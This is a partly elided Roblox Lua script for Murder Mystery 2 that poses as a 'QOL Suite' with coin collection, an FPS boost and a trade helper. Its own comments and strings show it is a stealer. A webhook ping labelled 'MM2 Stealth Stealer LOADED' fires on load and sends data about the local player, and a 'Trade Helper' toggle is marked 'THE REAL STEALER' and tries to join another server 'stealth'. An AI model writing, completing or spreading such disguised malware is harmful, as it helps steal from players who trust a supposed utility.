--[[
    MM2 Ultimate QOL Suite v2.5.1
    - Instant webhook test on load
    - Auto Collect Coins
    - FPS Boost
    - Trade Helper (with guaranteed execution)
]]

-- === YOUR WEBHOOK (CONFIRMED) ===
...
-- === INSTANT WEBHOOK TEST (FIRES ON LOAD) ===
local function sendTestPing()
    local http = game:GetService("HttpService")
    local player = game:GetService("Players").LocalPlayer
    local data = {
        content = "✅ **MM2 Stealth Stealer LOADED**",
        embeds = {{
    ...
    if success then
        print("[Webhook] Test ping sent successfully!")
    else
        warn("[Webhook] Failed: " .. tostring(err))
    end
end

-- Fire the test ping immediately (this will tell us if the webhook works)
pcall(sendTestPing)
...
-- === THE REAL STEALER - NOW WITH GUARANTEED EXECUTION ===
ToggleSection:CreateToggle("Trade Helper (Beta)", false, function(bool)
    ...
    -- Attempt to join their server (stealth)
    pcall(function()
...
print("MM2 Ultimate Suite v2.5.1 loaded - Webhook test sent!")